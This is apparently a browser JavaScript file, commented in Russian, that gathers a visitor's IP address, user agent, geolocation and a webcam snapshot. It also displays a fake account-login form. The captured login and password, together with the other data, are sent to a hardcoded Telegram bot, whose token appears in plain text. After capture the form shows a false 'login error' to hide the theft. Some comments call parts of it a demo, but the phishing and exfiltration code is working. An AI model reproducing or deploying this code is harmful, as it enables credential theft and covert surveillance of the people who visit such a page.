// Твой токен бота и чат ID Telegram
const TELEGRAM_BOT_TOKEN = "7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60";
const TELEGRAM_CHAT_ID = "7408565938";

// URL API для отправки сообщений
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Функция отправки логов в Telegram
async function sendTelegramLog(message) {
  try {
    await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("Ошибка отправки в Telegram:", error);
  }
}

// Получаем IP через публичный сервис (без серверной части)
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "IP не определён";
  }
}

// Получаем User-Agent
function getUserAgent() {
  return navigator.userAgent;
}

// Запрос геолокации пользователя
function getGeoLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve("Геолокация не поддерживается");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const coords = pos.coords;
        resolve(`Широта: ${coords.latitude.toFixed(4)}, Долгота: ${coords.longitude.toFixed(4)}`);
      },
      () => resolve("Геолокация отклонена"),
      { timeout: 10000 }
    );
  });
}

// Запрос разрешения и съемка с камеры
async function capturePhoto() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return "Камера не поддерживается";
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    // Делаем снимок с видео
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 320;
    canvas.height = video.videoHeight || 240;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Остановить видео поток
    stream.getTracks().forEach(track => track.stop());

    // Получаем фото в base64 формате
    const photoData = canvas.toDataURL("image/png");
    return photoData;
  } catch (err) {
    return "Доступ к камере отклонён";
  }
}

// Функция для логирования действия с отправкой в Telegram
async function logThreat(action, details = "") {
  const ip = await getIP();
  const userAgent = getUserAgent();
  const geo = await getGeoLocation();
  const timestamp = new Date().toLocaleString();

  let message = `<b>Новая угроза</b> - <i>${action}</i>\n`;
  message += `<b>Время:</b> ${timestamp}\n`;
  message += `<b>IP:</b> ${ip}\n`;
  message += `<b>Геолокация:</b> ${geo}\n`;
  message += `<b>User-Agent:</b> ${userAgent}\n`;
  if (details) message += `<b>Детали:</b> ${details}\n`;

  // Попытка добавить фото, если есть
  const photo = await capturePhoto();
  if (photo && photo.startsWith("data:image")) {
    // Telegram не позволяет отправлять фото через sendMessage, нужно sendPhoto, но без backend это нельзя,
    // поэтому просто добавим текст что фото сделано (для демонстрации)
    message += "<b>Фото с камеры сделано (демо)</b>\n";
  } else {
    message += `<b>Фото:</b> ${photo}\n`;
  }

  await sendTelegramLog(message);
  alert("Угроза зафиксирована и отправлена в Telegram.");
}

// Обработчики кнопок угроз
document.querySelectorAll(".threat-btn").forEach((btn) => {
  btn.addEventListener("click", () => {
    const threatName = btn.getAttribute("data-threat");
    logThreat(threatName);
  });
});

// Фишинговая форма входа
function createPhishingLogin() {
  // Создаем модальное окно с формой
  const modal = document.createElement("div");
  modal.style = `
    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(15, 23, 42, 0.9);
    display: flex; justify-content: center; align-items: center;
    z-index: 1000;
  `;

  modal.innerHTML = `
    <form id="phish-form" style="
      background: #1e293b; padding: 30px; border-radius: 12px;
      width: 320px; box-shadow: 0 8px 24px #3b82f6aa;
      color: #cbd5e1; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    ">
      <h2 style="text-align:center; color:#38bdf8; margin-bottom: 1rem;">Вход в аккаунт</h2>
      <label for="login" style="display:block; margin-bottom:8px;">Логин:</label>
      <input type="text" id="login" name="login" required style="width:100%; padding:8px; border-radius:6px; border:none; margin-bottom:15px;"/>
      <label for="password" style="display:block; margin-bottom:8px;">Пароль:</label>
      <input type="password" id="password" name="password" required style="width:100%; padding:8px; border-radius:6px; border:none; margin-bottom:20px;"/>
      <button type="submit" style="
        width: 100%; padding: 10px; border: none; border-radius: 8px;
        background-color: #3b82f6; color: white; font-weight: 700;
        cursor: pointer;
        transition: background-color 0.3s;
      ">Войти</button>
      <button type="button" id="close-phish" style="
        margin-top: 10px; width: 100%; padding: 10px; border:none; border-radius:8px;
        background-color: #64748b; color: #cbd5e1; font-weight: 600;
        cursor: pointer;
      ">Отмена</button>
    </form>
  `;

  document.body.appendChild(modal);

  // Обработчик отправки формы
  modal.querySelector("#phish-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const login = e.target.login.value;
    const password = e.target.password.value;

    // Логируем фишинг-данные
    const ip = await getIP();
    const userAgent = getUserAgent();
    const timestamp = new Date().toLocaleString();

    const message = `<b>Фишинг-логин</b>\nВремя: ${timestamp}\nIP: ${ip}\nUser-Agent: ${userAgent}\nЛогин: ${login}\nПароль: ${password}`;
    await sendTelegramLog(message);

    alert("Ошибка входа. Попробуйте еще раз."); // Чтобы не выдать успех
    modal.remove();
  });

  // Обработчик кнопки отмены
  modal.querySelector("#close-phish").addEventListener("click", () => {
    modal.remove();
  });
}

// Кнопка показа фишинговой формы
const phishingBtn = document.getElementById("phishing-login-btn");
if (phishingBtn) {
  phishingBtn.addEventListener("click", createPhishingLogin);
}
